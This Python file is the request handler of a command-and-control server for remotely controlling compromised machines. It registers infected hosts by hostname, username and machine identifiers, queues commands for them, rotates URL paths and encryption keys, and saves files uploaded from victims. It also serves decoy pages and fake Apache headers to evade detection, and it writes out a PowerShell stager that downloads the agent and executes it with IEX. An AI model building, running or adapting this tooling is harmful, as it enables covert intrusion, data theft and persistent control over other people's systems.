import http.server
import json
import base64
import os
import time
from datetime import datetime
from utils.client_identity import extract_system_info
from utils.path_rotation import PathRotationManager
from utils.agent_generator import generate_agent_code

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Handles client check-ins, commands, and file transfers with encryption
    Supports dynamic URL paths and client-specific key rotation after verification
    """
    
    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
        self.client_manager = client_manager
        self.logger = logger
        self.crypto_manager = crypto_manager
        self.campaign_name = campaign_name
        
        # Set default URL paths
        self.default_paths = {
            "beacon_path": "/beacon",
            "agent_path": "/raw_agent",
            "stager_path": "/b64_stager",
            "cmd_result_path": "/command_result",
            "file_upload_path": "/file_upload"
        }
        
        # Initialize path rotation if server has it
        self._initialize_path_rotation(server, url_paths)
        
        # Check if rotation is needed
        self.path_manager.check_rotation()
        
        # Get current paths from rotation manager
        self.url_paths = self.path_manager.get_current_paths()
        
        # Cache path mapping for quick lookups
        self.path_mapping = {}
        self._update_path_mapping()
                
        super().__init__(request, client_address, server)

    def _initialize_path_rotation(self, server, url_paths=None):
        """Initialize path rotation manager"""
        # Update paths with custom paths if provided
        initial_paths = self.default_paths.copy()
        if url_paths:
            initial_paths.update(url_paths)
            
        # Make sure all paths start with '/'
        for key, path in initial_paths.items():
            if not path.startswith('/'):
                initial_paths[key] = '/' + path
                
        # Use existing path manager if available
        if hasattr(server, 'path_manager'):
            self.path_manager = server.path_manager
        else:
            # Create path rotation manager if not already on server
            campaign_folder = f"{self.campaign_name}_campaign"
            rotation_interval = getattr(server, 'path_rotation_interval', 3600)  # Default 1 hour
            self.path_manager = PathRotationManager(
                campaign_folder, 
                self.logger, 
                initial_paths=initial_paths,
                rotation_interval=rotation_interval
            )
            # Load existing state if available
            self.path_manager.load_state()
            # Attach to server for other handlers to use
            server.path_manager = self.path_manager

    def _update_path_mapping(self):
        """Update the path mapping for quick lookups of which endpoint a path maps to"""
        self.path_mapping = {}
        
        # Add current paths to mapping
        for key, path in self.url_paths.items():
            self.path_mapping[path] = key
        
        # Also add previous rotation's paths for graceful transition
        if self.path_manager.rotation_counter > 0:
            previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
            if previous_paths:
                for key, path in previous_paths.items():
                    if path not in self.path_mapping:  # Don't overwrite current paths
                        self.path_mapping[path] = f"previous_{key}"

    def log_message(self, format, *args):
        self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def get_client_key(self, client_id):
        """Get the appropriate encryption key for a client"""
        # Use client-specific key if available, otherwise use campaign key
        if hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
            return self.client_manager.client_keys[client_id]
        # Fall back to campaign-wide key
        return self.crypto_manager.key

    def encrypt_for_client(self, data, client_id):
        """Encrypt data specifically for a client using their key if available"""
        key = self.get_client_key(client_id)
        
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Generate a random IV
        iv = os.urandom(16)
        
        # Encrypt the data using the same method from crypto_manager
        # but with client-specific key
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        # Add padding manually (simple PKCS7-like padding)
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padded_data = data + bytes([padding_length]) * padding_length
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV and ciphertext and base64 encode
        return base64.b64encode(iv + ciphertext).decode('utf-8')
    
    def decrypt_from_client(self, encrypted_data, client_id):
        """Decrypt data from a client using their key if available"""
        key = self.get_client_key(client_id)
        
        # Decode the base64
        encrypted_bytes = base64.b64decode(encrypted_data)
        
        # Extract the IV and ciphertext
        iv = encrypted_bytes[:16]
        ciphertext = encrypted_bytes[16:]
        
        # Decrypt the ciphertext
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove padding manually
        padding_length = padded_data[-1]
        data = padded_data[:-padding_length]
        
        return data.decode('utf-8')

    def do_GET(self):
        """Handle GET requests for beacons, agent code, and stagers"""
        # Check if rotation is needed before handling request
        if self.path_manager.check_rotation():
            self.url_paths = self.path_manager.get_current_paths()
            self._update_path_mapping()
            self.logger(f"Paths rotated during request handling: {self.url_paths}")

        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        # Look up the path in our mapping
        path_type = self.path_mapping.get(self.path)
        
        # Handle request based on path type
        if path_type in ["agent_path", "previous_agent_path"]:
            self.send_agent_response()
        elif path_type in ["stager_path", "previous_stager_path"]:
            self.send_b64_stager_response()
        elif path_type in ["beacon_path", "previous_beacon_path"]:
            self.handle_beacon()
        else:
            # Check for old rotation paths
            if self._handle_old_rotation_path():
                return
                
            # Default response for unmatched paths
            self.send_default_response()

    def _handle_old_rotation_path(self):
        """Handle requests to paths from older rotations"""
        for previous_rotation in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
            previous_paths = self.path_manager.get_path_by_rotation_id(previous_rotation)
            if previous_paths:
                for key, path in previous_paths.items():
                    if path == self.path:
                        # It's an old path, handle it accordingly
                        if key == "beacon_path":
                            self.logger(f"Request to old beacon path from rotation {previous_rotation}")
                            self.handle_beacon(include_rotation_info=True)
                            return True
                        elif key == "agent_path":
                            self.send_agent_response()
                            return True
                        elif key == "stager_path":
                            self.send_b64_stager_response()
                            return True
        return False
    
    def send_default_response(self):
        """Send a generic response for unmatched paths"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Return a generic-looking webpage to avoid detection
        message = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Website</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                h1 { color: #333; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Welcome</h1>
                <p>This page is currently under maintenance. Please check back later.</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self, include_rotation_info=False):
        """Process check-in requests from clients"""
        ip = self.client_address[0]
        self.logger(f"Beacon received from {ip}")
        
        # Extract client info and ID from headers
        client_id, system_info = self._extract_client_info()
        
        # Process the beacon
        commands = self._prepare_client_commands(client_id, system_info, include_rotation_info)
        
        # Send the response
        self._send_beacon_response(client_id, commands)
    
    def _extract_client_info(self):
        """Extract client information from request headers"""
        # Check for system information in headers
        system_info_encrypted = self.headers.get('X-System-Info')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        
        # Extract rotation info from headers (if client is using path rotation)
        client_rotation_id = self.headers.get('X-Rotation-ID')
        
        identified_client_id = None
        system_info = {}
        
        if system_info_encrypted:
            try:
                # Decrypt the system information
                system_info_json = self.crypto_manager.decrypt(system_info_encrypted)
                
                # Extract key system properties
                hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                
                # Add IP to system info
                system_info['ip'] = self.client_address[0]
                
                # Add unique client identifier if provided
                if client_identifier:
                    system_info['client_identifier'] = client_identifier
                    
                    # Check if this client_identifier is already known
                    for existing_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                            identified_client_id = existing_id
                            self.logger(f"Recognized returning client with identifier {client_identifier} as {identified_client_id}")
                            break
                
                # If we identified the client by identifier, use that ID, otherwise register as new
                client_id = identified_client_id
                if not client_id:
                    client_id = self.client_manager.add_client(
                        ip=self.client_address[0],
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                else:
                    # Update the existing client information
                    self.client_manager.add_client(
                        ip=self.client_address[0],
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                
                self.logger(f"Client identified as {client_id} ({hostname}/{username})")
                
            except Exception as e:
                self.logger(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = self.client_address[0]
                self.client_manager.add_client(client_id)
        else:
            # Fall back to IP-based identification for compatibility
            client_id = self.client_address[0]
            self.client_manager.add_client(client_id)
            
        return client_id, system_info

    def _prepare_client_commands(self, client_id, system_info, include_rotation_info=False):
        """Prepare commands for client including verification, key rotation if needed"""
        commands = self.client_manager.get_pending_commands(client_id)
        
        # Process client verification if possible
        key_rotation_needed = self._process_client_verification(client_id, system_info)
        
        # Move any key rotation commands to the front
        commands = self._prioritize_key_rotation_commands(commands)
        
        # Add key rotation command if needed
        if key_rotation_needed:
            commands = self._add_key_rotation_command(client_id, commands)
        
        # Log the commands being sent
        for command in commands:
            cmd_type = command['command_type']
            args = command['args'] if cmd_type != 'key_rotation' else '[REDACTED KEY]'
            self.client_manager.log_event(client_id, "Command send", f"Type: {cmd_type}, Args: {args}")
        
        # Add path rotation information if needed
        if include_rotation_info:
            rotation_info = self.path_manager.get_rotation_info()
            rotation_command = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "command_type": "path_rotation",
                "args": json.dumps({
                    "rotation_id": rotation_info["current_rotation_id"],
                    "next_rotation_time": rotation_info["next_rotation_time"],
                    "paths": rotation_info["current_paths"]
                })
            }
            commands.append(rotation_command)
            self.logger(f"Sending path rotation info to client {client_id}: Rotation {rotation_info['current_rotation_id']}")
            
        return commands
    
    def _process_client_verification(self, client_id, system_info):
        """Process client verification and determine if key rotation is needed"""
        key_rotation_needed = False
        
        # Verify client identity if verifier is available
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            verifier = self.server.client_verifier
            is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
            
            # Add logging for verification status
            self.logger(f"Verification result for {client_id}: verified={is_verified}, confidence={confidence}")
            
            # Update client verification status
            self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
            
            # Check if client needs key rotation
            has_unique_key = False
            if hasattr(self.client_manager, 'has_unique_key'):
                has_unique_key = self.client_manager.has_unique_key(client_id)
            else:
                # Fallback to direct check
                has_unique_key = hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
            
            # Check for manual key rotation request 
            requested_key_rotation = False
            for cmd in self.client_manager.get_pending_commands(client_id):
                if cmd.get('command_type') == 'key_rotation':
                    requested_key_rotation = True
                    self.logger(f"Manual key rotation requested for client {client_id}")
                    break

            # Decide if key rotation is needed
            key_rotation_needed = (is_verified and (not has_unique_key or requested_key_rotation))
            
            if not is_verified:
                warning_str = ", ".join(warnings)
                self.logger(f"WARNING: Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
            
            # Register/update this client information for future reference
            verifier.register_client(client_id, system_info)
            
        return key_rotation_needed

    def _prioritize_key_rotation_commands(self, commands):
        """Move any key rotation commands to the front of the queue"""
        has_key_rotation = False
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_rotation = True
                # Move it to the front if it's not already
                if i > 0:
                    rotation_command = commands.pop(i)
                    commands.insert(0, rotation_command)
                break
        
        return commands
    
    def _add_key_rotation_command(self, client_id, commands):
        """Add a key rotation command to the beginning of the commands list"""
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        # Add to the beginning of the command list
        commands.insert(0, key_rotation_command)
        self.logger(f"Key rotation command issued for client {client_id}")
        
        return commands
    
    def _send_beacon_response(self, client_id, commands):
        """Send the encrypted response to the client beacon"""
        # Encrypt commands json before sending
        commands_json = json.dumps(commands)
        
        # Check if we have key rotation commands to set header flag
        has_key_rotation = any(cmd.get('command_type') == 'key_rotation' for cmd in commands)
        
        # Use client-specific key if available, otherwise use the campaign key
        encrypted_commands = self.encrypt_for_client(commands_json, client_id)
        
        # Send encrypted data
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        # Include current rotation ID in header to keep client in sync
        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
        self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
        
        # Add a key rotation flag to help client know how to handle response
        if has_key_rotation:
            self.send_header("X-Key-Rotation", "true")
        
        self.end_headers()
        self.wfile.write(encrypted_commands.encode("utf-8"))
        
        # Only clear pending commands if we didn't send a key rotation command
        if not has_key_rotation:
            self.client_manager.clear_pending_commands(client_id)
        else:
            # If key rotation is happening, only clear the key rotation command
            self._clear_key_rotation_commands(client_id)
    
    def _clear_key_rotation_commands(self, client_id):
        """Clear key rotation commands but keep other commands for the client"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        new_pending = []
        for cmd in pending_commands:
            if cmd.get('command_type') != 'key_rotation':
                new_pending.append(cmd)
        
        # Temporarily clear all commands
        self.client_manager.clear_pending_commands(client_id)
        
        # Add back the non-key-rotation commands
        for cmd in new_pending:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )

    def _get_campaign_name(self):
        """Helper method to get the active campaign name"""
        # Use the campaign name provided during initialization if available
        if self.campaign_name:
            return self.campaign_name
            
        # Otherwise, try to find campaign directories
        campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
        if not campaign_dirs:
            return None
        # For now, just use the first campaign found
        return campaign_dirs[0][:-9]  # Remove "_campaign" suffix
    
    def send_agent_response(self):
        """Send the PowerShell agent code with path rotation support"""
        # Get the key as base64
        key_base64 = self.crypto_manager.get_key_base64()
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Get current paths
        current_paths = self.path_manager.get_current_paths()
        
        # Get rotation information
        rotation_info = self.path_manager.get_rotation_info()
        
        # Generate the agent code with custom URL paths and rotation info
        agent_code = generate_agent_code(
            key_base64, 
            server_address, 
            beacon_path=current_paths["beacon_path"],
            cmd_result_path=current_paths["cmd_result_path"],
            file_upload_path=current_paths["file_upload_path"],
            rotation_info=rotation_info  # Pass rotation info to the agent generator
        )

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Add some legitimate-looking headers to blend in with normal web traffic
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_b64_stager_response(self):
        """Send a Base64 encoded stager that will download and execute the agent"""
        # Use the current agent path
        current_paths = self.path_manager.get_current_paths()
        agent_path = current_paths["agent_path"]
        
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{agent_path}');IEX($S)"
        
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Add some legitimate-looking headers to blend in with normal web traffic
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))

    def do_POST(self):
        """Handle POST requests for command results and file uploads"""
        # Check if rotation is needed before handling request
        if self.path_manager.check_rotation():
            self.url_paths = self.path_manager.get_current_paths()
            self._update_path_mapping()
        
        # Log the request details
        self.log_message(f"Received POST request for {self.path}")

        # Look up the path in our mapping
        path_type = self.path_mapping.get(self.path)
        
        if path_type in ["cmd_result_path", "previous_cmd_result_path"]:
            self.handle_command_result()
        elif path_type in ["file_upload_path", "previous_file_upload_path"]:
            self.handle_file_upload()
        else:
            # Check for old rotation paths
            for previous_rotation in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
                previous_paths = self.path_manager.get_path_by_rotation_id(previous_rotation)
                if previous_paths:
                    for key, path in previous_paths.items():
                        if path == self.path:
                            # It's an old path, handle it accordingly
                            if key == "cmd_result_path":
                                self.handle_command_result()
                                return
                            elif key == "file_upload_path":
                                self.handle_file_upload()
                                return
            
            # Return a generic 200 response to avoid detection
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

    def handle_command_result(self):
        """Process command results sent from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        # Extract client info and identify the client
        client_id = self._identify_client_for_result()
        
        # Process the result data
        self._process_command_result(client_id, encrypted_data)
        
        # Send a success response
        self._send_success_response()
    
    def _identify_client_for_result(self):
        """Identify the client from headers or IP for command results"""
        client_identifier = self.headers.get('X-Client-ID')
        identified_client_id = None
        
        if client_identifier:
            # If we have a client identifier header, use it for logging
            self.logger(f"Result received from client ID {client_identifier} (IP: {self.client_address[0]})")
            
            # Try to find the actual client_id from the identifier
            for client_id, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    identified_client_id = client_id
                    break
        
        if not identified_client_id:
            # Try finding client by IP
            for client_id, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    identified_client_id = client_id
                    break
        
        return identified_client_id
    
    def _process_command_result(self, client_id, encrypted_data):
        """Process an encrypted command result"""
        try:
            # Decrypt the result using the appropriate key
            if client_id:
                result_data = self.decrypt_from_client(encrypted_data, client_id)
            else:
                # Fall back to campaign-wide key
                result_data = self.crypto_manager.decrypt(encrypted_data)
            
            # Try to parse the result as JSON
            try:
                result_json = json.loads(result_data)
                if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                    # This is a structured result with timestamp
                    timestamp = result_json['timestamp']
                    result = result_json['result']
                    
                    if client_id:
                        self.client_manager.add_command_result(client_id, timestamp, result)
                        self.logger(f"Result processed for client {client_id} (timestamp: {timestamp})")
                    else:
                        # If no client was found, log as a generic result
                        self.logger(f"Result received from unknown client {self.client_address[0]}: {result_data}")
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
                else:
                    # Unstructured result, log as is
                    self.logger(f"Result received from {self.client_address[0]}: {result_data}")
                    
                    # Try to find client by IP if not already identified
                    if not client_id:
                        for cid, client_info in self.client_manager.get_clients_info().items():
                            if client_info.get('ip') == self.client_address[0]:
                                self.client_manager.log_event(cid, "Command Result Received", f"{result_data}")
                                break
                        else:
                            self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
                    else:
                        self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
            except json.JSONDecodeError:
                # Not JSON, treat as plain text result
                self.logger(f"Result received from {self.client_address[0]}: {result_data}")
                
                # Try to find client by IP if not already identified
                if not client_id:
                    for cid, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('ip') == self.client_address[0]:
                            self.client_manager.log_event(cid, "Command Result Received", f"{result_data}")
                            break
                    else:
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
                else:
                    self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                    
        except Exception as e:
            self.logger(f"Error decrypting result from {self.client_address[0]}: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bad Request")  # Generic error message
            return False
            
        return True
    
    def _send_success_response(self):
        """Send a successful response with rotation info headers"""
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Include current rotation ID in header to keep client in sync
        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
        self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
        self.end_headers()
        self.wfile.write(b"OK")  # Simple response to look more generic

    def handle_file_upload(self):
        """Process file uploads from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # Identify the client
            client_id = self._identify_client_for_upload()
            
            # Decrypt and process the file data
            file_path = self._process_file_upload(client_id, encrypted_data)
            
            if file_path:
                # Send successful response
                self._send_success_response()
            
        except Exception as e:
            self.logger(f"Error handling file upload from {ip}: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server Error")  # Generic error message
            
    def _identify_client_for_upload(self):
        """Identify the client from headers or IP for file uploads"""
        client_identifier = self.headers.get('X-Client-ID')
        client_id = None
        
        if client_identifier:
            # Try to find the client ID from the identifier
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    client_id = cid
                    break
        
        if not client_id:
            # Try to find by IP
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    client_id = cid
                    break
                    
        return client_id
            
    def _process_file_upload(self, client_id, encrypted_data):
        """Process and store an uploaded file"""
        # Decrypt the file data
        if client_id:
            file_content = self.decrypt_from_client(encrypted_data, client_id)
        else:
            # Fall back to campaign key
            file_content = self.crypto_manager.decrypt(encrypted_data)
        
        # Create uploads directory if it doesn't exist
        campaign_name = self._get_campaign_name()
        if not campaign_name:
            self.logger("Campaign not found for file upload")
            return None
                
        campaign_folder = campaign_name + "_campaign"
        
        # Determine file path - use client ID if available, otherwise IP
        client_id_for_path = client_id or self.client_address[0]
        uploads_folder = os.path.join(campaign_folder, "uploads", client_id_for_path)
        os.makedirs(uploads_folder, exist_ok=True)
        
        # Process the file content
        try:
            # Try to parse as JSON (might be a file info structure)
            file_info = json.loads(file_content)
            if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                # This is a structured file upload
                file_name = file_info['FileName']
                file_content_base64 = file_info['FileContent']
                file_content_bytes = base64.b64decode(file_content_base64)
                
                file_path = os.path.join(uploads_folder, file_name)
                with open(file_path, 'wb') as f:
                    f.write(file_content_bytes)
                
                self.logger(f"File uploaded from {client_id_for_path}: {file_name} ({len(file_content_bytes)} bytes)")
                if client_id:
                    self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
                    
                return file_path
            else:
                # Not a structured file upload, save as raw text
                return self._save_raw_text_upload(uploads_folder, file_content, client_id)
        except json.JSONDecodeError:
            # Not JSON, save as raw text
            return self._save_raw_text_upload(uploads_folder, file_content, client_id)
            
    def _save_raw_text_upload(self, uploads_folder, content, client_id=None):
        """Save raw text content as a file"""
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
        
        with open(file_path, 'w') as f:
            f.write(content)
            
        self.logger(f"Raw text uploaded from {client_id or self.client_address[0]} and saved to {file_path}")
        if client_id:
            self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            
        return file_path